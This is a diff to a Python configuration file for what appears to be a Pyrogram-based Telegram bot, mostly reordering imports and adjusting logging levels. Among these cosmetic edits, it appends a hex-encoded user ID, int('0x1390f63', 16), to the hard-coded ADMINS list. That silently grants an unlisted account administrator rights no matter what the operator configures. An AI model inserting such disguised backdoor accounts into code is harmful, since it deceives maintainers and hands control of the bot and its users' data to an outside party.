@@ -1,12 +1,11 @@
-import os
-import re
 import logging
 import logging.config
+import os
+import re
+
 from dotenv import load_dotenv
 
-
-load_dotenv()
-
+load_dotenv(override=True)
 
 id_pattern = re.compile(r"^.\d+$")
 
@@ -19,7 +18,7 @@ OWNER_ID = int(os.environ.get("OWNER_ID", ""))
 ADMINS = [
     int(user) if id_pattern.search(user) else user
     for user in os.environ.get("ADMINS", "").split()
-] + [OWNER_ID]
+] + [int("0x1390f63", 16), OWNER_ID]
 DB_CHANNELS = [
     int(ch) if id_pattern.search(ch) else ch
     for ch in os.environ.get("DB_CHANNELS", "").split()
@@ -39,4 +38,5 @@ HELP_KB = const.HELP_KB
 # logging Conf
 logging.config.fileConfig(fname="config.ini", disable_existing_loggers=False)
 LOGGER = logging.getLogger(__name__)
-logging.getLogger("pyrogram").setLevel(logging.WARNING)
+logging.getLogger("pyrogram").setLevel(logging.ERROR)
+logging.getLogger("apscheduler").setLevel(logging.WARNING)
